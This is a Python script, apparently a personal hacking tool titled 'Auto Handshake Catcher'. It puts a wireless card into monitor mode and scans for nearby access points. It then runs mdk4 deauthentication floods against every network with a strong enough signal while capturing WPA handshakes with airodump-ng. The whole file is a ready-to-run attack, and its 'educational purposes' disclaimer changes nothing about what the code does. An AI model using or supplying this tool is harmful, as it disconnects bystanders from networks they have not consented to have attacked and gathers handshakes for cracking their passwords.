import subprocess
import time
import os
import re
from datetime import datetime
import csv
import pandas as pd
import sys

def get_network_interfaces():
    try:
        output = subprocess.check_output(["iwconfig"])
        os.system("clear")
        output = output.decode("utf-8")
        interfaces = re.findall(r"(\w+)\s+IEEE",output)
        return interfaces
    except Exception as e:
        print("Get Network Interfaces Error")
        sys.exit(0)
        return []

def monitor_mode(interface):
    try:
        resp = subprocess.run(["airmon-ng","start",interface])
        if resp.returncode == 0:
            os.system("clear")
            print("The adapter was put into monitor mode")
        else:
            print("Failed to put adapter into monitor mode")
            sys.exit(0)
    except Exception as e:
        print(f"Error {e}")

def scan_ap(interface):
    create_folder = datetime.today().date()
    path = os.getcwd()
    folder_path = os.path.join(path,str(create_folder))
    #print(folder_path)
    if os.path.isdir(folder_path):
        os.system(f"rm -rf {folder_path}")
    else:
        pass

    os.system(f"mkdir {create_folder}")
    scanner = subprocess.Popen(["airodump-ng",interface,"-w",f"{str(create_folder)}/scan","--band","abg"])
    time.sleep(30)
    scanner.terminate()
    os.system("clear")

    scan_file = folder_path + "/scan-01.csv"
    aps = []

    datas = pd.read_csv(scan_file)
    #print(datas.columns)
    #print(datas.at[4,' ESSID'])
    #print(datas.at[4,' channel'])
    for i in range(len(datas)):
        if datas.at[i,"BSSID"] == "Station MAC":
            break
        else:
            if datas.at[i," ESSID"] != "":
                ap = [datas.at[i,"BSSID"],datas.at[i,' channel'],datas.at[i," ESSID"].replace(" ",""),datas.at[i," Power"]]
                #print(f"BSSID: {ap[0]}, Channel: {ap[1]}, ESSID: {ap[2]}")
                #print(int(ap[3]))
                if ap[2] != "" and int(ap[3]) > -80:
                    aps.append(ap)
            else:
                continue
    sorted_aps = sorted(aps,key=lambda x: x[3], reverse=True)
    #print(sorted_aps)
    print("Found Access Points:")
    for i in range(len(aps)):
        print(f"{i+1}- BSSID: {sorted_aps[i][0]}, Channel: {(sorted_aps[i][1]).replace(' ','')}, Power: {sorted_aps[i][3]}, ESSID: {sorted_aps[i][2]}")
    time.sleep(3)
    return sorted_aps

def get_handshake(bssid,channel,essid,interface):
    create_files = datetime.today().date()
    cap = str(create_files) + "/" + essid
    print(cap)
    print(bssid)
    print(channel)
    print(essid)
    print(interface)
    listen_command = f"airodump-ng --bssid {bssid} --channel{channel} -w {cap} --update 1 {interface}"
    deauth_command = f"mdk4 {interface} d -B {bssid} -c {channel}"

    deauth_process = subprocess.Popen(deauth_command,stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    listen_process = subprocess.Popen(listen_command,shell=True)

    time.sleep(15)
    deauth_process.terminate()
    time.sleep(35)
    deauth_process = subprocess.Popen(deauth_command,stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    time.sleep(15)
    deauth_process.terminate()
    subprocess.run(["killall","mdk4"],stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(120)
    listen_process.terminate()
    subprocess.run(["killall","airodump-ng"],stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    time.sleep(1)
    subprocess.run(["reset"])
    time.sleep(1)
    os.system("clear")


if __name__ == "__main__":
    interfaces = []
    interfaces = get_network_interfaces()


    rasp ="""\033[38;2;176;0;96m\033[1m
     ⢀⣠⣤⣶⣶⣶⣤⣄⠀⠀⣀⣤⣶⣶⣶⣤⣄⡀⠀
    ⠀⢸⣿⠁⠀⠀⠀⠀⠙⢷⡾⠋⠀⠀⠀⠀⠈⣿⡇⠀
    ⠀⠘⢿⡆⠀⠀⠀⠢⣄⣼⣧⣠⠔⠀⠀⠀⢰⡿⠃⠀
    ⠀⠀⠈⠻⣧⣤⣀⣤⣾⣿⣿⣷⣤⣀⣤⣼⠟⠁⠀⠀
    ⠀⠀⣰⡾⠋⠉⣩⣟⠁⠀⠀⠈⣻⣍⠉⠙⢷⣆⠀⠀
    ⠀⢀⣿⣀⣤⡾⠛⠛⠷⣶⣶⠾⠛⠛⢷⣤⣀⣿⡀⠀
    ⣰⡟⠉⣿⡏⠀⠀⠀⠀⢹⡏⠀⠀⠀⠀⢹⣿⠉⢻⣆
    ⣿⡇⠀⣿⣇⠀⠀⠀⣠⣿⣿⣄⠀⠀⠀⣸⣿⠀⢸⣿
    ⠙⣷⣼⠟⠻⣿⣿⡿⠋⠁⠈⠙⢿⣿⣿⠟⠻⣧⣾⠋
    ⠀⢸⣿⠀⠀⠈⢿⡇⠀⠀⠀⠀⢸⡿⠁⠀⠀⣿⡇⠀
    ⠀⠀⠻⣧⣀⣀⣸⣿⣶⣤⣤⣶⣿⣇⣀⣀⣼⠟⠀⠀
    ⠀⠀⠀⠈⠛⢿⣿⣿⡀⠀⠀⢀⣿⣿⡿⠛⠁⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠟⠋⠀⠀⠀⠀⠀⠀⠀

    \033[0m
    """

    wipi = """\033[38;2;176;0;96m
iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii
██████          ██████ ██████████ ██████████████ ██████████
██░░██          ██░░██ ██░░░░░░██ ██░░░░░░░░░░██ ██░░░░░░██
██░░██          ██░░██ ████░░████ ██░░██████░░██ ████░░████
██░░██          ██░░██   ██░░██   ██░░██──██░░██   ██░░██ii
██░░██  ██████  ██░░██   ██░░██   ██░░██████░░██   ██░░██ii
██░░██  ██░░██  ██░░██   ██░░██   ██░░░░░░░░░░██   ██░░██ii
██░░██  ██░░██  ██░░██   ██░░██   ██░░██████████   ██░░██ii
██░░██████░░██████░░██   ██░░██   ██░░██           ██░░██ii
██░░░░░░░░░░░░░░░░░░██ ████░░████ ██░░██         ████░░████
██░░██████░░██████░░██ ██░░░░░░██ ██░░██         ██░░░░░░██
██████  ██████  ██████ ██████████ ██████         ██████████
iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii
        \033[0m
        """
    wipi_lines = wipi.split('\n')
    rasp_lines = rasp.split('\n')
    for line in range(len(wipi_lines)):
        time.sleep(0.2)
        #print(line)
        print(f"{wipi_lines[line].replace('i',' ')}     {rasp_lines[line]}")
    print("------------------------------------Berk Küçük-------------------------------------".replace("-"," "))
    print("------------------------------Auto Handshake Catcher------------------------------".replace("-"," "))
    print("This code was developed for educational purposes. Do not use for illegal purposes.")
    time.sleep(4)
    print("\n")
    mon_interface = ""
    try:
        while True:
            sayac = 1
            for interface in interfaces:
                print(str(sayac)+"- "+ interface)
                sayac += 1
            resp = input("Choose your wifi card:")
            if int(resp) <=len(interfaces) and int(resp) > 0:
                break
            else:
                os.system("clear")
                print("What the hell are you doing. Select your card and enter card id.")

        interface = interfaces[int(resp) - 1]
        monitor_mode(interface)
        interfaces = get_network_interfaces()

        number = interface[-1]
        #print(number)
        #print(interfaces)

        for mon_interface_name in interfaces:
            if interface == mon_interface_name:
                mon_interface = mon_interface_name
                break
            else:
                pass

        if mon_interface == "":
            mon_interface = interface + "mon"
        #print(mon_interface)
        aps = scan_ap(mon_interface)

        for ap in aps:
            get_handshake(ap[0],ap[1],ap[2],mon_interface)

        subprocess.run(["airmon-ng","stop", mon_interface])
        os.system("clear")
        print("Handshake was caught from all networks. The program has been completed. See you buddy :)")
    except KeyboardInterrupt:
        if mon_interface !="":
            subprocess.run(["airmon-ng","stop", mon_interface])
            os.system("clear")
            print("\nYour network card is returned to managed mode and the program is closed. GoodBye :P")
        else:
            print("\nYour network card is returned to managed mode and the program is closed. GoodBye :P")
